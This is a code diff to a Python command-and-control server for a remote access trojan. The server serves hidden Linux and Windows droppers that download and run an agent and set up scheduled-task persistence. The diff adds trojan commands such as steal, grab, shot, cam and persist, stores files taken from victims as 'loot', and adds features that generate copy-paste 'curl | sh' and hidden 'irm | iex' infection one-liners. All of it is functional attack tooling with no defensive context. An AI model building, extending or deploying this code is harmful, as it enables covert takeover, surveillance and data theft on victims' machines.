@@ -9,8 +9,8 @@ TOKEN = os.environ.get("AGENT_TOKEN") or secrets.token_hex(12)
 BASE = os.environ.get("BASE_URL", "").rstrip("/")
 
 LOCK = threading.RLock()
-S = {}        # sid -> {info,last,q,out,seq,up}
-LOOT = {}     # fid -> {name,size,data}
+S = {}
+LOOT = {}
 
 def base_of(h):
     if BASE: return BASE
@@ -31,12 +31,30 @@ def agent_src(host):
                  .replace("__TOKEN__", TOKEN)
                  .replace("__NAME__", "k" + secrets.token_hex(3)))
 
+SIMPLE = {"info": "info", "ps": "ps", "shot": "shot", "cam": "cam", "pwd": "pwd",
+          "steal": "steal", "grab": "grab", "persist": "persist",
+          "unpersist": "unpersist", "sd": "sd", "py": "py",
+          "toast": "toast", "vibrate": "vibrate", "audio": "audio"}
+
+def to_agent(line):
+    rid = secrets.token_hex(4)
+    if not line.startswith("."):
+        return {"t": "shell", "id": rid, "a": line}
+    b = line[1:].split(None, 1)
+    c = b[0].lower() if b else ""
+    a = b[1] if len(b) > 1 else ""
+    if c == "cd":   return {"t": "cd", "id": rid, "a": a or "~"}
+    if c == "ls":   return {"t": "ls", "id": rid, "a": a}
+    if c == "get":  return {"t": "get", "id": rid, "a": a}
+    if c == "clip": return {"t": "clip", "id": rid, "op": "set" if a else "get", "a": a}
+    if c in SIMPLE: return {"t": SIMPLE[c], "id": rid, "a": a}
+    return {"t": "shell", "id": rid, "a": line}
+
 BSH = r"""#!/bin/sh
 B="__B__"; D="$HOME/.cache/.k"
 mkdir -p "$D" 2>/dev/null
 command -v python3 >/dev/null || { command -v pkg >/dev/null && pkg install -y python >/dev/null 2>&1; }
 command -v python3 >/dev/null || { command -v apt >/dev/null && (apt update -qq; apt install -y python3) >/dev/null 2>&1; }
-command -v curl >/dev/null || { command -v wget >/dev/null && alias curl="wget -qO-"; }
 curl -fsSL "$B/a" -o "$D/k.py" 2>/dev/null || wget -q "$B/a" -O "$D/k.py"
 command -v termux-wake-lock >/dev/null && termux-wake-lock
 nohup python3 "$D/k.py" >/dev/null 2>&1 &
@@ -60,20 +78,23 @@ Start-Process -WindowStyle Hidden -FilePath $py -ArgumentList "`"$d\k.py`""
 schtasks /create /tn SysSvc /tr "`"$py`" `"$d\k.py`"" /sc onlogon /f | Out-Null
 """
 
-PANEL = r"""<!doctype html><meta charset=utf-8><title>C2</title>
+PANEL = r"""<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>C2</title>
 <style>
 body{background:#0d1117;color:#c9d1d9;font:13px ui-monospace,monospace;margin:0;padding:10px}
-#h{display:flex;gap:8px;align-items:center;margin-bottom:8px}
+#h{display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:8px}
 input,button{background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:5px;font:inherit}
 button{cursor:pointer}#s div{padding:3px;border-bottom:1px solid #21262d;cursor:pointer}
 #s div:hover{background:#161b22}#t{height:45vh;overflow:auto;background:#010409;padding:6px;white-space:pre-wrap;border:1px solid #21262d}
 #c{width:100%;box-sizing:border-box;margin-top:6px}#l div{padding:2px}
-.ok{color:#3fb950}.off{color:#8b949e}
+.ok{color:#3fb950}.off{color:#8b949e}#lk{font-size:11px;margin-bottom:8px}
+code{background:#010409;padding:2px 4px}
 </style>
-<div id=h><b>C2</b><input id=k placeholder="AUTH key" size=22><button onclick=save()>connect</button>
-<button onclick="cmd('.steal')">steal</button><button onclick="cmd('.shot')">shot</button>
-<button onclick="cmd('.info')">info</button></div>
-<div id=s></div><div id=t></div><input id=c placeholder="command (dot = rat cmd)" onkeydown="if(event.key=='Enter')run()">
+<div id=h><b>C2</b><input id=k placeholder="AUTH key" size=20><button onclick=save()>connect</button>
+<button onclick="links()">links</button><button onclick="cmd('.steal')">steal</button>
+<button onclick="cmd('.shot')">shot</button><button onclick="cmd('.info')">info</button>
+<button onclick="q('#f').click()">put</button><input type=file id=f style=display:none onchange=up()></div>
+<div id=lk></div>
+<div id=s></div><div id=t></div><input id=c placeholder="commande (. = RAT cmd)" onkeydown="if(event.key=='Enter')run()">
 <div id=l></div>
 <script>
 let K=localStorage.k||'',cur=null,seq=0,t1,t2;
@@ -82,6 +103,13 @@ function save(){K=q('#k').value;localStorage.k=K;poll()}
 async function api(p,o){o=o||{};o.headers=Object.assign({'X-Auth':K},o.headers||{});return fetch(p,o)}
 function cmd(c){if(!cur)return;api('/api/cmd',{method:'POST',body:JSON.stringify({sid:cur,cmd:c})})}
 function run(){const v=q('#c').value;if(!v||!cur)return;q('#c').value='';cmd(v)}
+async function up(){const f=q('#f').files[0];if(!f||!cur)return;
+ await api('/api/put',{method:'POST',body:f,headers:{'X-Sid':cur,'X-Name':f.name}});
+ q('#t').textContent+='[sent] '+f.name+'\n';q('#f').value=''}
+function links(){const o=location.origin;
+ q('#lk').innerHTML='<div><b>linux</b> <code>curl -fsSL '+o+'/i | sh</code> <button onclick="cp(this)">copy</button></div>'+
+ '<div><b>windows</b> <code>powershell -w hidden -c "irm '+o+'/i.ps1 | iex"</code> <button onclick="cp(this)">copy</button></div>'}
+function cp(b){navigator.clipboard.writeText(b.previousElementSibling.textContent)}
 async function poll(){
  clearInterval(t1);clearInterval(t2);
  t1=setInterval(async()=>{
@@ -123,7 +151,6 @@ class H(BaseHTTPRequestHandler):
         n = int(self.headers.get("Content-Length") or 0)
         return self.rfile.read(n) if n else b""
 
-    # ---------------- GET ----------------
     def do_GET(self):
         u = urlparse(self.path); p = u.path; qs = parse_qs(u.query)
 
@@ -132,6 +159,11 @@ class H(BaseHTTPRequestHandler):
         if p == "/i": return self.snd(200, BSH.replace("__B__", base_of(self)), "text/x-shellscript")
         if p == "/i.ps1": return self.snd(200, PSH.replace("__B__", base_of(self)), "text/plain")
         if p == "/a": return self.snd(200, agent_src(self), "text/x-python")
+
+        if p == "/link":
+            if not self.auth(): return
+            o = base_of(self)
+            return self.snd(200, "linux:  curl -fsSL %s/i | sh\nwindows: powershell -w hidden -c \"irm %s/i.ps1 | iex\"\n" % (o, o))
 
         if p == "/py":
             try:
@@ -180,10 +212,8 @@ class H(BaseHTTPRequestHandler):
                 return self.snd(200, f["data"], "application/octet-stream",
                                 {"Content-Disposition": 'attachment; filename="%s"' % f["name"]})
             return self.snd(404, "?")
-
         self.snd(404, "?")
 
-    # ---------------- POST ----------------
     def do_POST(self):
         u = urlparse(self.path); p = u.path
 
@@ -207,8 +237,8 @@ class H(BaseHTTPRequestHandler):
                     e = s["up"].pop(fid, None)
                     if e:
                         d = b"".join(e["b"])
-                        with LOCK: LOOT[fid] = {"name": os.path.basename(e["name"]), "size": len(d), "data": d}
                         with LOCK:
+                            LOOT[fid] = {"name": os.path.basename(e["name"]), "size": len(d), "data": d}
                             s["seq"] += 1
                             s["out"].append((s["seq"], "[loot] %s (%d b)\n" % (e["name"], len(d))))
             return self.snd(200, "ok")
@@ -219,7 +249,7 @@ class H(BaseHTTPRequestHandler):
                 j = json.loads(self.body() or b"{}")
                 sid = j.get("sid")
                 with LOCK:
-                    if sid in S: S[sid]["q"].append({"t": "shell", "id": secrets.token_hex(4), "a": j.get("cmd", "")})
+                    if sid in S: S[sid]["q"].append(to_agent(j.get("cmd", "")))
                 return self.snd(200, "ok")
             if p == "/api/put":
                 sid = self.headers.get("X-Sid"); name = self.headers.get("X-Name", "f.bin")
@@ -234,7 +264,6 @@ class H(BaseHTTPRequestHandler):
                     S[sid]["q"].append({"t": "put_end", "id": rid, "fid": fid})
                 return self.snd(200, "queued")
             return self.snd(404, "?")
-
         self.snd(404, "?")
 
 if __name__ == "__main__":
